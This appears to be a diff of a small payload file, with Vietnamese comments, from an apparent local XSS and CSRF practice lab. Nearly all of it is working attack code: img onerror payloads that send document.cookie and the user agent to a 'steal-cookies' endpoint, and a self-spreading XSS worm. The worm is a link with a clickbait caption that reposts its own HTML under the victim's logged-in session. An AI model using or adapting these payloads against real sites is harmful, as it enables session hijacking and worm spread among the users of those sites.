@@ -1,7 +1,11 @@
 
 // Đoạn code để lấy cookies
-
  <img src="x" onerror="alert(document.cookie)"> 
 <img src="x" onerror="fetch('http://localhost:5002/steal-cookies', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:document.cookie,userAgent:navigator.userAgent})})">
 // Gửi cookies đến attacker
 <img src="x" onerror="fetch('http://localhost:5002/steal-cookies', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:document.cookie,userAgent:navigator.userAgent})})">
+
+// Code tao con worm XSS
+//Phương thức get cho RSFS attacker
+<a href=# onclick="fetch(`http://localhost:5001/api/posts/create?content=${encodeURIComponent(this.outerHTML)}`,{method:'GET',credentials:'include'})">Click để xem ảnh hot!</a>
+// Post
